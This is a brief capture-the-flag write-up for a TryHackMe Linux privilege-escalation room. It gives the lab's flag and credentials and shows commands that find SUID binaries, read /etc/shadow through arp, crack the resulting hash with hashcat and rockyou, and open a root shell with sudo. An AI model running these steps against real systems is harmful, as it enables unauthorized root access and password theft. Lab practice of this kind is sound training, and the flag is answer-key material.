# Matheus Jesus 11-04-2020

## Try Hack Me - Linux Privesc Playground (https://tryhackme.com/room/privescplayground)

### IP 10.10.169.48

### SSH CREDS user:password

#### user is already root

cat /root/flag.txt
flag.txt -> THM{3asy_f14g_1m40}

#### SUID

find / -perm /u=s 2>/dev/null

https://gtfobins.github.io/gtfobins/arp/
(https://github.com/mzfr/gtfo)
exploit it to read files

```sh
LFILE=/etc/shadow
sudo arp -v -f "$LFILE"
```

##### Shadow crack

hashcat -m 1800 -a 0 -o found1.txt hash.txt /usr/share/wordlists/rockyou.txt --force
$6$uTSx9lr5$aUa23L083PGfA1NYsK36QXotKO.2duX0PRDClSdL3IFa74Hm0NspHgr1wdhzbWugsRNSKfMJg5tblqdy6EKdh/:password

#### Sudo

try running

sudo /bin/bash
